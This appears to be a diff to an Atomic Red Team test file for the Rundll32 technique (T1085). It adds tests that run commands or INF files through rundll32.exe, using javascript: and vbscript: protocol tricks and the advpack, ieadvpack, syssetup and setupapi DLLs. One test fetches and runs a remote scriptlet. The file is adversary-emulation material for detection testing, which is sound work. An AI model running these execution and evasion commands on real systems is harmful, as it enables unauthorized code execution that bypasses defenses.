@@ -11,9 +11,99 @@ atomic_tests:
     file_url:
       description: location of the payload
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
   executor:
     name: command_prompt
     elevation_required: false
     command: |
-      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
+
+- name: Rundll32 execute VBscript command
+  description: |
+    Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
+
+    Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+  supported_platforms:
+    - windows
+  input_arguments:
+    command_to_execute:
+      description: Command for rundll32.exe to execute
+      type: string
+      default: calc.exe
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
+
+- name: Rundll32 advpack.dll Execution
+  description: |
+    Test execution of a command using rundll32.exe with advpack.dll.
+
+    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+  supported_platforms:
+    - windows
+  input_arguments:
+    inf_to_execute:
+      description: Local location of inf file
+      type: string
+      default: PathToAtomicsFolder\T1085\src\T1085.inf
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+- name: Rundll32 ieadvpack.dll Execution
+  description: |
+    Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
+  supported_platforms:
+    - windows
+  input_arguments:
+    inf_to_execute:
+      description: Local location of inf file
+      type: string
+      default: PathToAtomicsFolder\T1085\src\T1085.inf
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+- name: Rundll32 syssetup.dll Execution
+  description: |
+    Test execution of a command using rundll32.exe with syssetup.dll.
+
+    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
+  supported_platforms:
+    - windows
+  input_arguments:
+    inf_to_execute:
+      description: Local location of inf file
+      type: string
+      default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}
+
+- name: Rundll32 setupapi.dll Execution
+  description: |
+    Test execution of a command using rundll32.exe with setupapi.dll.
+
+    Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
+  supported_platforms:
+    - windows
+  input_arguments:
+    inf_to_execute:
+      description: Local location of inf file
+      type: string
+      default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\#{inf_to_execute}
